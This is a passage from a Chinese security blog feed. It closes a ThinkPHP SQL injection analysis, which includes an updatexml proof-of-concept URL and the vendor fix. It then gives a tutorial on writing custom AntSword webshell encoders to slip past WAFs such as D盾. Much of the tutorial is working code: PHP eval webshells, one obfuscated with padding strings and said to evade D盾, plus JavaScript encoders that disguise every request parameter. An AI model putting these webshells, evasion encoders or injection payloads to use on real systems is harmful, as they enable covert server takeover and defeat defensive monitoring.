class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>必须同时满足<code>$option</code>是一个数组并且<code>$option</code>数组中的元素大于0并且查询出的主键<code>$pk</code>是一个数组才会进入判断，显然这里不满足<code>$pk</code>是一个数组的条件，所以不会进入循环。继续往下：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607170544.png" alt="20200607170544"></p><p>来到<code>_parseOptions</code>函数，进入此函数：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607170706.png" alt="20200607170706"></p><p>使用<code>array_merge</code>函数将<code>$option</code>与option合并，合并结果还是<code>$option</code>,因为<code>$this-&gt;option</code>是一个空数组。继续往下：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607171326.png" alt="20200607171326"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 对数组查询条件进行字段类型检查</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fields</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_scalar</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_parseType</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析这个判断，发现<code>$options[&#39;where&#39;]</code>并不是一个数组，所以不会进入判断，继续往下：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607171630.png" alt="20200607171630"></p><p>可以看到又一个表达式过滤函数<code>_options_filter</code>,进入这个函数：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607171734.png" alt="20200607171734"></p><p>发现是个空函数，所以不会进行任何过滤，继续往下：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607171854.png" alt="20200607171854"></p><p>开始调用tp的select方法在数据库中查找数据，进入到select方法中可看到查询的sql语句还是我们拼接过后的，所以就导致了sql注入的产生：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607172106.png" alt="20200607172106"></p><h2 id="产生注入的原因"><a href="#产生注入的原因" class="headerlink" title="产生注入的原因"></a>产生注入的原因</h2><p>为什么tp没有对我们传入的数据进行过滤呢？带着这个疑问我们走一遍正常的流程，将poc换为：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">http://127.0.0.1:8888/index.php?m=Home&amp;c=Index&amp;a=test&amp;id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>和之前一样的流程就不截图了，走到这里的时候不一样了：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607173325.png" alt="20200607173325"></p><p>由于此时的<code>$options[&#39;where&#39;]</code>是一个数组了，所以会进入判断：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607173535.png" alt="20200607173535"></p><p>然后进过<code>_parseType</code>方法处理：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607173711.png" alt="20200607173711"></p><p>进过<code>inrval</code>函数处理后在输入的sql语句就是正常的了，这样就不会产生注入</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607174119.png" alt="20200607174119"></p><p>所以导致注入产生的原因是构造的poc绕过了tp对<code>$option[&#39;where&#39;]</code>是否是一个数组的判断，从而不会进入循环，也不会经<code>_parseType</code>函数处理从而导致了注入。</p><p>官方的修复方法是：<br><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo20200607194512.png" alt="20200607194512"><br>在<code>_parseOptions</code>函数处理时不传入<code>$option</code>，这样经过<code>_parseOptions</code>处理过后，<code>$option</code>始终为空,也就是我们传入的poc执行后的sql语句就变成了：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>无论你查询什么都只会返回第一条数据，这种处理方式还是挺暴力的。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>本次注入的产生不只有find方法，select，delete等方法产生注入的原理也是和上文一样的，具体过程就不再分析。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁剑自定义编码器和解码器来bypass waf</title>
      <link href="2020/05/19/antsword-bypass-waf/"/>
      <url>2020/05/19/antsword-bypass-waf/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>蚁剑和菜刀一样是一款优秀的webshell管理工具（shll控制端），与菜刀相比，蚁剑具有开源，自定义能力强，跨平台等优点。在waf普遍的今天，蚁剑这款工具提供了自定义header，自定义body，自定义编码器和解码器等功能来bypass waf，实在不行，如果你有NodeJs的开发能力，你还可以修改源代码来逃避waf的特征检测。学会使用这些功能，waf再也不是渗透测试中的拦路虎，当然连接马的前提是马儿必须免杀。</p><h2 id="修改蚁剑的UA"><a href="#修改蚁剑的UA" class="headerlink" title="修改蚁剑的UA"></a>修改蚁剑的UA</h2><p>你是否遇到过webshell已经上传成功，但使用蚁剑去连接时就是连接不上的情况呢？发生的原因绝大数是因为被waf拦截了，waf会检测常用的webshell连接工具的一些特征，比如User-Agent,遇到明显的UA特征肯定会拦截。下面是蚁剑默认的UA：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2014%2012%2018.png" alt="20200519141218"></p><p>太明显了，蚁剑多种方式可以修改User-Agent。</p><p>1.修改源代码</p><p>在项目路径<code>.modules/request.js</code>中进行修改:</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2014%2022%2027.png" alt="20200519142227"></p><p>另外项目路径下的<code>.modules/update.js</code>也需要修改：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2014%2026%2048.png" alt="20200519142648"></p><p>2.为单独的webshell添加请求头</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2014%2029%2002.png" alt="20200519142902"></p><p>3.全局设置中添加请求头</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2014%2039%2036.png" alt="20200519143936"></p><h2 id="使用编码器"><a href="#使用编码器" class="headerlink" title="使用编码器"></a>使用编码器</h2><p>先说下蚁剑编码器的作用，当使用蚁剑控制webshell向服务器发送数据包时，数据包中的body部分会按照编码器中定义的规则进行编码或者加密后在发送，这样就可以避免有比较明显的命令执行特征从儿被WAF拦截。</p><p>先看下不使用编码器时，蚁剑是如何发包的，执行一个查看文件的操作，抓包观察：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2014%2059%2023.png" alt="20200519145923"></p><p>其中<code>l76cc4f5b31b36</code>是蚁剑随机生成的一个变量，其中的值是经过base64编码的，解码后为要查看的文件名：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2015%2001%2019.png" alt="20200519150119"></p><p>变量<code>test</code>为蚁剑连接webshell的密码，也就是 php <code>_POST</code>变量中接收数据的参数</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2015%2004%2021.png" alt="20200519150421"></p><p>可以看到<code>test</code>后面的值都是明文的php代码，这样就很容易被waf检测到。</p><p>使用蚁剑自带的<code>base64</code>编码器连接抓包查看：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2016%2013%2042.png" alt="20200519161342"></p><p>相较不使用编码器多了一个参数<code>s4c932eb660f94</code>,这个参数测内容就是base64编码后的读取文件的php代码，然后使用参数<code>test</code>进行base64解码<code>s4c932eb660f94</code>中的内容发送给服务端进行执行。这种编码方式虽然编码了读取文件操作的代码，但是在body中还是会有明文的php代码，接下来我们改动下base64编码器，让请求的数据包中不再有明文的php代码。</p><h3 id="自定义一个编码器"><a href="#自定义一个编码器" class="headerlink" title="自定义一个编码器"></a>自定义一个编码器</h3><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2016%2025%2048.png" alt="20200519162548"></p><p>在这之前先了解下蚁剑的编码器规则：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/** * php::base64编码器 * Create at: 2020/05/19 16:35:59 */</span><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token comment">/** @param  &#123;String&#125; pwd   连接密码* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组* @return &#123;Array&#125;  data  编码器处理后的 payload 数组*/</span>module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">pwd<span class="token punctuation">,</span> data<span class="token punctuation">,</span> ext<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// ##########    请在下方编写你自己的代码   ###################</span>  <span class="token comment">// 以下代码为 PHP Base64 样例</span>  <span class="token comment">// 生成一个随机变量名</span>  <span class="token keyword">let</span> randomID <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_0x</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token comment">// 原有的 payload 在 data['_']中</span>  <span class="token comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span>  data<span class="token punctuation">[</span>randomID<span class="token punctuation">]</span> <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span>  data<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">eval(base64_decode($_POST[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>randomID<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">]));</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token comment">// ##########    请在上方编写你自己的代码   ###################</span>  <span class="token comment">// 删除 _ 原有的payload</span>  <span class="token keyword">delete</span> data<span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 返回编码器处理后的 payload 数组</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的注释已经写的很清楚了，我们在自定义编码方式时只需要去修改<code>data[&#39;_&#39;]</code>中的内容就可以了，下面是我对默认编码器的修改：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/** * php::base64编码器 * Create at: 2020/05/19 16:57:59 */</span><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token comment">/** @param  &#123;String&#125; pwd   连接密码* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组* @return &#123;Array&#125;  data  编码器处理后的 payload 数组*/</span>module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">pwd<span class="token punctuation">,</span> data<span class="token punctuation">,</span> ext<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// ##########    请在下方编写你自己的代码   ###################</span>  <span class="token comment">// 以下代码为 PHP Base64 样例</span>  data<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ##########    请在上方编写你自己的代码   ###################</span>  <span class="token comment">// 删除 _ 原有的payload</span>  <span class="token keyword">delete</span> data<span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 返回编码器处理后的 payload 数组</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于上述的编码器没有自动解码传入的payload，所以需要在webshell中解码payload，将webshell改为如下的形式：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>抓包查看请求的数据包：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2019%2017%2002%2055.png" alt="20200519170255"></p><p>请求包中的<code>test</code>参数也被base64编码，已经没有明文的php代码了。这样就实现了一个简单的编码器，但是这样的编码器并不能bypass waf，因为有些waf会对请求的数据进行base64解码，从而就发现了我们的payload。没关系，既然了解了编码器的原理，那我们就可以变幻出各种payload来绕过waf。</p><p>例如：</p><ul><li>为payload的base64编码后的数据前后添加几个字符串，让waf解码base64失败</li><li>先用rot13加密payload然后再base64编码</li><li>先用base64编码再使用hex编码</li></ul><p>总之，你可以天马行空，使用各种编码组合来伪装自己的payload，任由waf多强大，也不可能全部解密出payload。</p><p>下面就写一个自定义的编码器来绕过D盾：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token comment">/** @param  &#123;String&#125; pwd   连接密码* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组* @return &#123;Array&#125;  data  编码器处理后的 payload 数组*/</span>module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">pwd<span class="token punctuation">,</span> data<span class="token punctuation">,</span> ext<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// ##########    请在下方编写你自己的代码   ###################</span>  <span class="token comment">// 原有的 payload 在 data['_']中</span>  <span class="token comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span>  data<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//base64编码的前后再拼接随意定义的一个字符串</span>  data<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"lwk02nm"</span> <span class="token operator">+</span> data<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span><span class="token punctuation">;</span>  data<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string">"lwk02nm"</span><span class="token punctuation">;</span>    <span class="token comment">// ##########    请在上方编写你自己的代码   ###################</span>  <span class="token comment">// 删除 _ 原有的payload</span>  <span class="token keyword">delete</span> data<span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 返回编码器处理后的 payload 数组</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后上传到服务器的webshell就需要写成下面这样：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$st</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lwk02nm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$st</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$sa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>令人意外的是上面的webshell尽然可以对D盾免杀，D盾只报了1级。</p></blockquote><p>抓包查看此编码器发给服务端的数据包：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2020%2014%2047%2012.png" alt="20200520144712"></p><p>可看到的确在数据包前后添加了我们自定义的字符串，这样的话就可避免waf使用base64解码成功，但是webshell却可以正常处理payload。</p><p>下面验证下自定义的编码器能否bypass D盾：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2021%2011%2013%2017.png" alt="20200521111317"></p><p>D盾将上传的webshell判断为1级，1级是可以免杀的，再结合我们的编码器就可以顺利byapss：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2021%2011%2016%2029.png" alt="20200521111629"></p><h3 id="bypass命令执行"><a href="#bypass命令执行" class="headerlink" title="bypass命令执行"></a>bypass命令执行</h3><p>意外总是来的太快，使用上面的编码器确实可以使用蚁剑连接我们的webshell了，也可以查看目录下的文件，但确无法执行命令，每次命令执行都会被D盾拦截。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2021%2012%2032%2058.png" alt="20200521123258"></p><p>抓包观察下发送的数据包：</p><p>可看到参数<code>kd8aa13e6949d3</code>的值还是base64编码，解码后的值为：<code>cd /d &quot;C:/phpstudy/PHPTutorial/WWW&quot;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</code>还是具有明显的特征会被waf拦截。</p><p>由于蚁剑只会对<code>data[pwd]</code>里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。那有办法将全部的参数编码吗？在蚁剑的一个issue里，作者给出了解决办法，具体的请去<a href="https://github.com/AntSwordProject/antSword/issues/185">这里</a>查看。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2021%2013%2044%2011.png" alt="20200521134411"></p><p>可以看到解决办法是遍历<code>data[_]</code>取出其中的值并将其全部编码,按照这种思路修改下上面写的编码器：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * php::base64编码器 * Create at: 2020/05/21 13:07:23 */</span><span class="token string single-quoted-string">'use strict'</span><span class="token punctuation">;</span><span class="token comment">/** @param  &#123;String&#125; pwd   连接密码* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组* @return &#123;Array&#125;  data  编码器处理后的 payload 数组*/</span>module<span class="token operator">.</span>exports <span class="token operator">=</span> <span class="token punctuation">(</span>pwd<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// ##########    请在下方编写你自己的代码   ###################</span>  let ret <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>let <span class="token constant">_</span> in data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">_</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">continue</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    ret<span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span> <span class="token operator">=</span> Buffer<span class="token operator">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ret<span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'lwk02nm'</span> <span class="token operator">+</span> ret<span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ret<span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string single-quoted-string">'lwk02nm'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  ret<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">=</span> Buffer<span class="token operator">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ret<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'lwk02nm'</span> <span class="token operator">+</span> ret<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span><span class="token punctuation">;</span>  ret<span class="token punctuation">[</span>pwd<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token string single-quoted-string">'lwk02nm'</span><span class="token punctuation">;</span>  <span class="token comment">// 返回编码器处理后的 payload 数组</span>  <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>顺利byapass D盾</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2021%2018%2014%2055.png" alt="20200521181455"></p><p>抓包查看发送的数据可看到所有的参数值都已经过编码器的编码，这样就能有效防止waf的base64解码了。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2021%2018%2025%2027.png" alt="20200521182527"></p><p><a href="https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php/encoder">这个项目</a>中有一些写好的编码器，大家可以拿来用，另外你也可以按照自己的思路去写一个编码器，这样bypass效果会更好。</p><p><strong>yzddmr6大佬已经通过修改蚁剑源码实现了上述功，项目地址是：<a href="https://github.com/yzddmr6/antSword">https://github.com/yzddmr6/antSword</a></strong></p><h2 id="使用解码器"><a href="#使用解码器" class="headerlink" title="使用解码器"></a>使用解码器</h2><p>蚁剑的编码器是编码或者加密蚁剑向服务端发送的请求包的，所以解码器是用来编码或者加密服务端返回给蚁剑的数据包的，编码后的数据包只有蚁剑能够解码。经测试，使用编码器其实就能够bypass D盾了，但是不排除有些waf会检测返回包，所以有时也需要使用解码器。蚁剑自带了两种解码器，base64和rot13，下面还是通过抓包的方式来对比不使用解码器和使用了解码器后返回包的不同。</p><p>不使用解码器：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2022%2010%2012%2013.png" alt="20200522101213"></p><p>可看到返回包中的数据均已明文显示。</p><p>使用base64解码器：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2022%2010%2014%2001.png" alt="20200522101401"></p><p>现在的返回包中的数据都已使用base64进行编码了。</p><blockquote><p>很多新手朋友在使用蚁剑时都会认为编码器和解码器是成对存在的，使用了base64编码器就必须使用base64解码器，其实不是这样的，编码器和解码器除了名字有点类似，在使用时毫无关系（RAS和AES加密方式的编码器和解码器除外）。</p></blockquote><p>分析下蚁剑解码器的写法：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/** * php::base64解码器 * Create at: 2020/05/22 10:21:48 */</span><span class="token string">'use strict'</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/**   * @returns &#123;string&#125; asenc 将返回数据base64编码   * 自定义输出函数名称必须为 asenc   * 该函数使用的语法需要和shell保持一致   */</span>  <span class="token function-variable function">asoutput</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">function asenc($out)&#123;      return @base64_encode($out);    &#125;    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n\s+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">/**   * 解码 Buffer  